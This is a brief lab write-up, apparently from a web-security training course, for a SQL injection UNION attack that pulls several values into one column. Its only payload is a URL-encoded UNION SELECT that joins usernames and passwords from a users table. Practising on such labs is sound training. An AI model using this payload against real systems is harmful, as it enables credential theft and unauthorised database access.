# Lab: SQL injection UNION attack, retrieving multiple values in a single column

## Objective
Perform the attack to solve SQL injection UNION attack, retrieving multiple values in a single column.

## Payload
```text
'+UNION+SELECT+NULL,+username || '~' || password+FROM+users--
```
